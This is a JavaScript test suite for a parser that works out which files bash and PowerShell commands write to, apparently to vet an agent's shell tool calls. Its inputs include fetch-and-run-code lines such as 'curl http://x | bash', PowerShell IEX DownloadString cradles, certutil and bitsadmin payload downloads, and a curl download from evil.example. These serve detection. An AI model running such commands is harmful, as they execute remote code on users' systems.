import { test } from 'node:test'
import assert from 'node:assert/strict'

import { extractShellWrites, extractCommand } from '../lib/shell.js'

function known(command, tool = 'bash') {
  const extracted = extractShellWrites(tool, { command })
  return extracted ? extracted.known : []
}

function unknown(command, tool = 'bash') {
  const extracted = extractShellWrites(tool, { command })
  return extracted ? extracted.unknown : []
}

// ---------------------------------------------------------------------------
// Known content
// ---------------------------------------------------------------------------

test('heredoc content and path are extracted', () => {
  const command = ["cat > tools/setup.sh <<'EOF'", 'echo hi', 'curl http://x | bash', 'EOF'].join('\n')
  const writes = known(command)
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'tools/setup.sh')
  assert.match(writes[0].content, /curl http:\/\/x \| bash/)
  assert.equal(writes[0].source, 'heredoc')
})

test('append heredoc is extracted', () => {
  const command = ['cat >> run.sh <<EOF', 'whoami', 'EOF'].join('\n')
  assert.equal(known(command)[0].path, 'run.sh')
})

test('echo redirect is extracted', () => {
  const writes = known('echo "IEX DownloadString" > payload.ps1')
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'payload.ps1')
  assert.equal(writes[0].content, 'IEX DownloadString')
})

test('printf redirect is extracted', () => {
  const writes = known("printf 'hello\\n' > notes.txt")
  assert.equal(writes[0].path, 'notes.txt')
})

test('redirect target without a space is extracted', () => {
  const writes = known("printf 'hello\\n' >notes.txt")
  assert.equal(writes[0].path, 'notes.txt')
})

test('quoted target with spaces is extracted', () => {
  const writes = known('echo x > "my file.sh"')
  assert.equal(writes[0].path, 'my file.sh')
})

test('PowerShell Set-Content is extracted', () => {
  const writes = known(`Set-Content -Path "run.ps1" -Value "IEX (New-Object Net.WebClient).DownloadString('http://x')"`, 'pwsh')
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'run.ps1')
  assert.match(writes[0].content, /DownloadString/)
})

test('PowerShell Out-File without -Value is an unknown write, not empty content', () => {
  const extracted = extractShellWrites('pwsh', { command: '"payload" | Out-File -FilePath run.ps1' })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'run.ps1')
  assert.equal(extracted.unknown[0].source, 'out-file')
})

test('.NET WriteAllText is extracted', () => {
  const writes = known('[System.IO.File]::WriteAllText("x.ps1", "calc.exe")', 'pwsh')
  assert.equal(writes[0].path, 'x.ps1')
  assert.equal(writes[0].content, 'calc.exe')
})

test('New-Item -ItemType File is extracted', () => {
  const writes = known('New-Item -ItemType File -Path "a.sh" -Value "echo hi"', 'pwsh')
  assert.equal(writes[0].path, 'a.sh')
  assert.equal(writes[0].content, 'echo hi')
})

// ---------------------------------------------------------------------------
// Unknown content
// ---------------------------------------------------------------------------

test('curl -o is an unknown write', () => {
  const writes = unknown('curl -fsSL https://x -o payload.sh')
  assert.equal(writes[0].path, 'payload.sh')
  assert.equal(writes[0].source, 'download')
})

test('wget -O is an unknown write', () => {
  const writes = unknown('wget -O tool.exe https://x')
  assert.equal(writes[0].path, 'tool.exe')
})

test('Invoke-WebRequest -OutFile is an unknown write', () => {
  const writes = unknown("Invoke-WebRequest https://x -OutFile 'a.ps1'", 'pwsh')
  assert.equal(writes[0].path, 'a.ps1')
})

test('Invoke-RestMethod -OutFile is an unknown write', () => {
  const writes = unknown('irm https://x -OutFile payload.ps1', 'pwsh')
  assert.equal(writes[0].path, 'payload.ps1')
})

test('certutil and bitsadmin downloads are surfaced as dynamic unknowns', () => {
  const cert = unknown('certutil -urlcache -f https://x/payload.ps1 payload.ps1')
  assert.equal(cert[0].source, 'download')
  assert.equal(cert[0].dynamic, true)
  const bits = unknown('bitsadmin /transfer job https://x/payload.ps1 payload.ps1')
  assert.equal(bits[0].source, 'download')
  assert.equal(bits[0].dynamic, true)
})

test('PowerShell Tee-Object is a tee write', () => {
  const writes = unknown('Get-Content evil.txt | Tee-Object -FilePath payload.ps1', 'pwsh')
  assert.equal(writes[0].path, 'payload.ps1')
  assert.equal(writes[0].source, 'tee')
})

test('Tee-Object -Variable does not write a file', () => {
  assert.equal(extractShellWrites('pwsh', { command: 'Get-Content x | Tee-Object -Variable data' }), null)
})

test('Set-Item with a run-time value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Item -Path payload.ps1 -Value $payload',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'set-item')
})

test('Start-Process output redirection is a write', () => {
  const writes = unknown(
    'Start-Process tool.exe -RedirectStandardOutput out.ps1 -RedirectStandardError err.ps1',
    'pwsh',
  )
  assert.deepEqual(writes.map((w) => w.path), ['out.ps1', 'err.ps1'])
  assert.ok(writes.every((w) => w.source === 'redirect'))
})

test('--output=file and -OutFile:file separators are handled', () => {
  assert.equal(unknown('curl --output=payload.sh https://x')[0].path, 'payload.sh')
  assert.equal(unknown("Invoke-WebRequest https://x -OutFile:payload.sh", 'pwsh')[0].path, 'payload.sh')
})

test('Expand-Archive destination is unknown', () => {
  const writes = unknown('Expand-Archive x.zip -DestinationPath ./out', 'pwsh')
  assert.equal(writes[0].path, './out')
  assert.equal(writes[0].source, 'extract')
})

test('generic redirect without known content is unknown', () => {
  const writes = unknown('npm run build > build.log')
  assert.equal(writes[0].path, 'build.log')
  assert.equal(writes[0].source, 'redirect')
})

test('a quoted > is data, not a redirect', () => {
  assert.equal(extractShellWrites('bash', { command: 'echo "x > y"' }), null)
  assert.equal(extractShellWrites('bash', { command: 'echo "see > payload.ps1"' }), null)
})

test('commands inside bash -c are parsed recursively', () => {
  const writes = unknown('bash -c "cat payload > out.txt"')
  assert.equal(writes[0].path, 'out.txt')
  assert.equal(writes[0].source, 'redirect')
})

test('quoted data inside a nested command stays data', () => {
  assert.equal(extractShellWrites('bash', { command: `bash -c "echo 'a > b'"` }), null)
})

test('/dev/null and dup redirects are not writes', () => {
  assert.deepEqual(unknown('ls > /dev/null'), [])
  assert.deepEqual(unknown('cmd 2>&1'), [])
  assert.deepEqual(unknown('echo x > /dev/null'), [])
})

test('known writes are not duplicated as unknown', () => {
  const extracted = extractShellWrites('bash', { command: 'echo hi > a.sh' })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.unknown.length, 0)
})

// ---------------------------------------------------------------------------
// Shape
// ---------------------------------------------------------------------------

test('non-shell tools yield null', () => {
  assert.equal(extractShellWrites('write', { command: 'echo hi > a.sh' }), null)
  assert.equal(extractCommand('write', { command: 'x' }), null)
})

test('commands with no writes yield null', () => {
  assert.equal(extractShellWrites('bash', { command: 'ls -la && npm test' }), null)
})

test('pwsh tool name is accepted', () => {
  assert.ok(extractCommand('pwsh', { command: 'Get-Date' }))
  assert.ok(extractCommand('powershell', { command: 'Get-Date' }))
})

test('script argument is accepted as a command alias', () => {
  assert.ok(extractCommand('bash', { script: 'echo hi' }))
})

// ---------------------------------------------------------------------------
// Pipeline writers, dynamic values and archive defaults
// ---------------------------------------------------------------------------

test('tee writes are extracted as unknown content', () => {
  const extracted = extractShellWrites('bash', { command: 'echo "IEX payload" | tee payload.ps1' })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown.length, 1)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
  assert.equal(extracted.unknown[0].source, 'tee')
})

test('tee -a handles multiple targets and options', () => {
  const writes = unknown('cat <<EOF | tee -a a.txt b.ps1')
  assert.deepEqual(writes.map((w) => w.path).sort(), ['a.txt', 'b.ps1'])
  assert.ok(writes.every((w) => w.source === 'tee'))
})

test('Set-Content reads named parameters in any order', () => {
  const writes = known('Set-Content -Value "IEX payload" -Path run.ps1', 'pwsh')
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'run.ps1')
  assert.equal(writes[0].content, 'IEX payload')
})

test('Set-Content with a run-time value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Content -Path payload.ps1 -Value $payload',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
  assert.equal(extracted.unknown[0].source, 'set-content')
})

test('Set-Content with an expanding double-quoted value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Content -Path payload.ps1 -Value "prefix $payload"',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'set-content')
})

test('PowerShell special variables in a double-quoted value expand', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Content -Path payload.ps1 -Value "$_"',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'set-content')
})

test('Set-Content without -Value reads the pipeline and is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Get-Content evil.txt | Set-Content -Path payload.ps1',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
})

test('quoted semicolons stay inside a PowerShell argument', () => {
  const writes = known('Set-Content -Path run.ps1 -Value "safe; IEX payload"', 'pwsh')
  assert.equal(writes.length, 1)
  assert.match(writes[0].content, /IEX payload/)
})

test('.NET WriteAllText with a variable is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: '[IO.File]::WriteAllText("payload.ps1", $payload)',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
  assert.equal(extracted.unknown[0].source, 'dotnet-write')
})

test('.NET WriteAllText with a bare path is still extracted', () => {
  const extracted = extractShellWrites('pwsh', {
    command: '[IO.File]::WriteAllText($path, "calc.exe")',
  })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].path, '$path')
  assert.equal(extracted.known[0].dynamic, true)
})

test('.NET writes with unsplittable arguments are dynamic unknowns', () => {
  const extracted = extractShellWrites('pwsh', {
    command: '[IO.File]::WriteAllText((Join-Path $x "f.ps1"), "x")',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].dynamic, true)
})

test('New-Item with a variable value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'New-Item -ItemType File -Path "a.sh" -Value $payload',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'new-item')
})

test('heredoc with the redirect before the delimiter is extracted', () => {
  const command = ["cat <<'EOF' > tools/setup.sh", 'echo hi', 'curl http://x | bash', 'EOF'].join('\n')
  const writes = known(command)
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'tools/setup.sh')
  assert.match(writes[0].content, /curl http:\/\/x \| bash/)
})

test('printf format strings do not hide the written arguments', () => {
  const extracted = extractShellWrites('bash', { command: "printf '%s' 'IEX payload' > payload.txt" })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.txt')
  assert.equal(extracted.unknown[0].source, 'printf')
})

test('archive extraction defaults to the current directory', () => {
  const tar = extractShellWrites('bash', { command: 'tar -xzf evil.tar.gz' })
  assert.equal(tar.unknown[0].path, '.')
  assert.equal(tar.unknown[0].source, 'extract')
  const unzip = extractShellWrites('bash', { command: 'unzip evil.zip' })
  assert.equal(unzip.unknown[0].path, '.')
  const expand = extractShellWrites('pwsh', { command: 'Expand-Archive evil.zip' })
  assert.equal(expand.unknown[0].path, '.')
})

test('listing archives is not a write', () => {
  assert.equal(extractShellWrites('bash', { command: 'tar -tzf evil.tar.gz' }), null)
  assert.equal(extractShellWrites('bash', { command: 'unzip -l evil.zip' }), null)
})

test('7z output directory is read without a space', () => {
  const extracted = extractShellWrites('bash', { command: '7z x evil.7z -o./out' })
  assert.equal(extracted.unknown[0].path, './out')
  assert.equal(extracted.unknown[0].source, 'extract')
})

test('curl -O marks the remote name as dynamic', () => {
  const extracted = extractShellWrites('bash', { command: 'curl -O https://evil.example/payload.ps1' })
  assert.equal(extracted.unknown[0].source, 'download')
  assert.equal(extracted.unknown[0].dynamic, true)
})

test('wget -O- and curl -o - are stdout, not files', () => {
  assert.equal(extractShellWrites('bash', { command: 'wget -O- https://evil.example/x' }), null)
  assert.equal(extractShellWrites('bash', { command: 'curl -o - https://evil.example/x' }), null)
})

test('variable targets are marked dynamic', () => {
  const extracted = extractShellWrites('bash', { command: 'echo hi > "$OUT/payload.txt"' })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].dynamic, true)
})

test('command substitution targets are dynamic instead of silently skipped', () => {
  const extracted = extractShellWrites('bash', { command: 'cat data > "$(mktemp).txt"' })
  assert.equal(extracted.unknown[0].dynamic, true)
})

test('MSYS absolute paths are only unverifiable on win32', () => {
  const extracted = extractShellWrites('bash', { command: 'echo hi > /tmp/payload.txt' })
  assert.equal(extracted.known[0].path, '/tmp/payload.txt')
  assert.equal(extracted.known[0].dynamic, process.platform === 'win32')
})

test('&> redirects are writes too', () => {
  const writes = unknown('npm run build &> build.log')
  assert.equal(writes[0].path, 'build.log')
})

test('bash >| noclobber redirect is a write', () => {
  const writes = unknown('echo hi >| payload.ps1')
  assert.equal(writes[0].path, 'payload.ps1')
})

test('heredoc bodies are not parsed as commands', () => {
  const command = [
    "cat > notes.md <<'EOF'",
    'Set-Content -Path /tmp/example.ps1 -Value $payload',
    'EOF',
  ].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].path, 'notes.md')
  assert.equal(extracted.unknown.length, 0)
})

test('quoted << does not start a heredoc', () => {
  const command = ['echo "a << b"', 'echo hi > payload.txt'].join('\n')
  const writes = known(command)
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'payload.txt')
})

test('a shell heredoc body is parsed as commands', () => {
  const command = ["bash <<'EOF'", 'echo payload > run.ps1', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].path, 'run.ps1')
})

test('cat <<EOF | bash is parsed as a script', () => {
  const command = ["cat <<'EOF' | bash", 'echo payload > run.ps1', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.ok(extracted.known.some((w) => w.path === 'run.ps1'))
})

test('a non-shell heredoc is an opaque unknown', () => {
  const command = ["python3 <<'EOF'", 'open("x", "w").write("y")', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.unknown[0].source, 'stdin-script')
})

test('a non-shell interpreter behind a pipe is opaque', () => {
  const command = ["cat <<'EOF' | python3", 'print("hi")', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.unknown[0].source, 'stdin-script')
})

test('a PowerShell here-string body is not scanned as shell', () => {
  const command = [
    "python -c @'",
    "import re",
    "m = re.search(r'\s*<([0-9A-Fa-f]+)>', s)",
    "print(d[0:])",
    "print(d[j:])",
    "'@",
  ].join('\n')
  assert.equal(extractShellWrites('pwsh', { command }), null)
})

test('a here-string keeps a real redirect outside its body', () => {
  const command = ["@'", 'data', "'@ > out.txt"].join('\n')
  const extracted = extractShellWrites('pwsh', { command })
  assert.deepEqual(extracted.unknown.map((w) => w.path), ['out.txt'])
})

test('a here-string piped to bash is still parsed as a script', () => {
  const command = ["@'", 'echo hi > inner.txt', "'@ | bash"].join('\n')
  const extracted = extractShellWrites('pwsh', { command })
  assert.deepEqual(extracted.known.map((w) => w.path), ['inner.txt'])
})

test('an unterminated here-string masks its body', () => {
  const command = ["python -c @'", 'if a > b: pass', 'print(d[0:])'].join('\n')
  assert.equal(extractShellWrites('pwsh', { command }), null)
})

test('nested double quotes inside python -c are not redirects', () => {
  const command = [
    'python -c "',
    'import re',
    'm = re.search(r"<([^>]+)>", raw)',
    'if not m:',
    '    print("none")',
    '"',
  ].join('\n')
  assert.equal(extractShellWrites('pwsh', { command }), null)
})

test('python -c keeps a redirect that follows the script', () => {
  const command = 'python -c "print(1)" > out.txt'
  const extracted = extractShellWrites('pwsh', { command })
  assert.deepEqual(extracted.unknown.map((w) => w.path), ['out.txt'])
})

test('python -c slice notation is not a redirect', () => {
  const command = 'python -c "print(d[0:]); print(d[j:])"'
  assert.equal(extractShellWrites('pwsh', { command }), null)
})

test('node -e comparison operators are not redirects', () => {
  const command = 'node -e "console.log(1 > 0)"'
  assert.equal(extractShellWrites('pwsh', { command }), null)
})

function targets(tool, command) {
  const result = extractShellWrites(tool, { command })
  return result ? [...result.known, ...result.unknown].map(w => w.path).sort() : []
}

test('command names in prose, quotes and comments do not start commands', () => {
  for (const tool of ['pwsh', 'bash']) {
    const say = tool === 'pwsh' ? 'Write-Output' : 'echo'
    for (const text of ['Set-Content -Path fake -Value x', 'curl -o fake', 'bash -c "cat input > fake"']) {
      assert.deepEqual(targets(tool, `${say} '${text}'`), [])
      assert.deepEqual(targets(tool, `${say} '${text}' > real`), ['real'])
    }
    assert.deepEqual(targets(tool, `${say} Set-Content -Path fake; ${say} text # > junk\n${say} ok > real`), ['real'])
    assert.deepEqual(targets(tool, `${say} word#suffix > real`), ['real'])
  }
  assert.deepEqual(targets('pwsh', "<# Set-Content -Path fake -Value nope\n> junk #> 'ok' | Set-Content real"), ['real'])
  assert.deepEqual(targets('bash', 'echo ok # cat <<EOF\necho ok > real'), ['real'])
})

test('only shell redirect operators create targets', () => {
  assert.deepEqual(targets('bash', '[[ a > b && c < d ]] && echo ok > real'), ['real'])
  assert.deepEqual(targets('bash', '[[ a > b ]] > log'), ['log'])
  assert.deepEqual(targets('bash', 'echo \\> data; echo [[ > real'), ['real'])
  assert.deepEqual(targets('pwsh', 'Write-Output `> data; Write-Output ok > real'), ['real'])
})

test('inline script masking stops at its argument even with later matching quotes', () => {
  for (const tool of ['bash', 'pwsh']) {
    assert.deepEqual(targets(tool, 'python -c "print(1 > 0)" > "report file"; echo done > "second file"'), ['report file', 'second file'])
    assert.deepEqual(targets(tool, `node -e 'console.log(1 > 0)' | tee 'real file'`), ['real file'])
  }
  assert.deepEqual(targets('pwsh', `python -c "print(1 > 0)"; Set-Content -Path "real" -Value "ok"`), ['real'])
})

test('WhatIf is a local effective switch, not text or a global filter', () => {
  for (const flag of ['-WhatIf', '-wHaTiF:$true']) {
    assert.deepEqual(targets('pwsh', `Set-Content ${flag} -Path pretend -Value ok > log; Set-Content real ok`), ['log', 'real'])
    assert.deepEqual(targets('pwsh', `New-Item -Path pretend -ItemType File ${flag} | Out-File real`), ['real'])
    assert.deepEqual(targets('pwsh', `Expand-Archive pretend.zip -DestinationPath pretend ${flag}`), [])
  }
  for (const flag of ['-WhatIf:$false', '-WhatIf:$switch']) {
    assert.deepEqual(targets('pwsh', `Set-Content ${flag} -Path real -Value ok`), ['real'])
  }
  assert.equal(known(`Set-Content -Path real -- -WhatIf`, 'pwsh')[0].path, 'real')
  assert.deepEqual(known(`Set-Content -Path real -Value '-WhatIf'`, 'pwsh')[0].content, '-WhatIf')
  assert.deepEqual(targets('pwsh', `Set-Content -Value 'some -Path fake -WhatIf' -Path real`), ['real'])
  assert.deepEqual(targets('pwsh', `Set-Content -Encoding UTF8 -NoNewline real 'value -Path fake'`), ['real'])
  assert.deepEqual(targets('pwsh', `& 'Set-Content' -Value:ok -Path:'real file'`), ['real file'])
})

test('Env provider targets are not files; similarly named file paths still are', () => {
  for (const cmd of ['Set-Item', 'Set-Content', 'Add-Content']) {
    assert.deepEqual(targets('pwsh', `${cmd} -LiteralPath 'EnV:DEMO' -Value ok`), [])
    assert.deepEqual(targets('pwsh', `${cmd} './Env-demo' ok`), ['./Env-demo'])
    assert.deepEqual(targets('pwsh', `${cmd} -Path $env:OUTPUT_FILE -Value ok`), ['$env:OUTPUT_FILE'])
  }
  assert.deepEqual(targets('pwsh', 'New-Item -ItemType File -Path Env:DEMO; Out-File env.log'), ['env.log'])
  assert.deepEqual(targets('bash', 'echo ok > Env:demo'), ['Env:demo'])
})

test('a redirected here-string pipeline still inspects the nested shell', () => {
  const command = ["Write-Output @'", 'echo ok > nested.txt', "'@ | bash"].join('\n')
  assert.deepEqual(targets('pwsh', command), ['nested.txt'])
  assert.deepEqual(targets('pwsh', 'if ($ready) { Set-Content -Path notes.txt -Value ready }'), ['notes.txt'])
})

test('each statement and nested script gets its own write context', () => {
  const cwd = process.cwd()
  const result = extractShellWrites('bash', { command: `test -d . || echo maybe > same; echo yes > same; cd first && bash -c 'cd second && echo inner > leaf' && echo outer > leaf` }, cwd)
  const same = result.known.filter(w => w.path === 'same')
  assert.ok(same.some(w => !w.skipVerify && (w.baseDir ?? cwd) === cwd))
  const merged = extractShellWrites('bash', { command: 'cd first && echo one > a; echo two > b' }, cwd)
  assert.equal(merged.known.find(w => w.path === 'b').dynamic, true)
  const leaves = result.known.filter(w => w.path === 'leaf')
  assert.equal(leaves.length, 2)
  assert.ok(leaves.some(w => /[\\/]first[\\/]second$/.test(w.baseDir)))
  assert.ok(leaves.some(w => /[\\/]first$/.test(w.baseDir)))
})

test('New-Item defaults to a file when -ItemType is omitted', () => {
  const extracted = extractShellWrites('pwsh', { command: 'New-Item -Path n.txt -Value $var' }, 'C:/w')
  assert.deepEqual(extracted.unknown.map((w) => w.path), ['n.txt'])
})

test('New-Item with a literal value is a known write', () => {
  const extracted = extractShellWrites('pwsh', { command: "New-Item -Path n.txt -Value 'hello'" }, 'C:/w')
  assert.deepEqual(extracted.known.map((w) => w.path), ['n.txt'])
})

test('New-Item -ItemType Directory is not a file write', () => {
  assert.equal(extractShellWrites('pwsh', { command: 'New-Item -ItemType Directory -Path d1' }, 'C:/w'), null)
})

test('New-Item skips a directory type given after the path', () => {
  assert.equal(extractShellWrites('pwsh', { command: 'New-Item -Path d2 -ItemType Directory' }, 'C:/w'), null)
})

test('PowerShell aliases resolve to the cmdlet they stand for', () => {
  assert.deepEqual(extractShellWrites('pwsh', { command: 'sc -Path a.txt -Value hi' }, 'C:/w').known.map((w) => w.path), ['a.txt'])
  // The piped value is not a literal, so the content is unknown, not known.
  assert.deepEqual(extractShellWrites('pwsh', { command: 'gc x | sc out.txt' }, 'C:/w').unknown.map((w) => w.path), ['out.txt'])
})

test('copy and move report their destination', () => {
  assert.deepEqual(extractShellWrites('bash', { command: 'cp a.txt b.txt' }, 'C:/w').unknown.map((w) => w.path), ['b.txt'])
  assert.deepEqual(extractShellWrites('pwsh', { command: 'Copy-Item a.txt b.ps1' }, 'C:/w').unknown.map((w) => w.path), ['b.ps1'])
  assert.deepEqual(extractShellWrites('pwsh', { command: 'Move-Item a.txt b.txt' }, 'C:/w').unknown.map((w) => w.path), ['b.txt'])
})

test('dd reports its of= target', () => {
  assert.deepEqual(extractShellWrites('bash', { command: 'dd if=/dev/zero of=d.bin bs=1M' }, 'C:/w').unknown.map((w) => w.path), ['d.bin'])
})

test('export-csv reports its path', () => {
  assert.deepEqual(extractShellWrites('pwsh', { command: 'Get-Process | Export-Csv e.csv' }, 'C:/w').unknown.map((w) => w.path), ['e.csv'])
})

test('a literal invoke-expression is parsed as a command', () => {
  const extracted = extractShellWrites('pwsh', { command: 'iex "Set-Content z.txt hi"' }, 'C:/w')
  assert.deepEqual(extracted.known.map((w) => w.path), ['z.txt'])
})

test('a dynamic invoke-expression is surfaced, not ignored', () => {
  const extracted = extractShellWrites('pwsh', { command: 'iex $payload' }, 'C:/w')
  assert.equal(extracted.unknown[0].source, 'stdin-script')
})
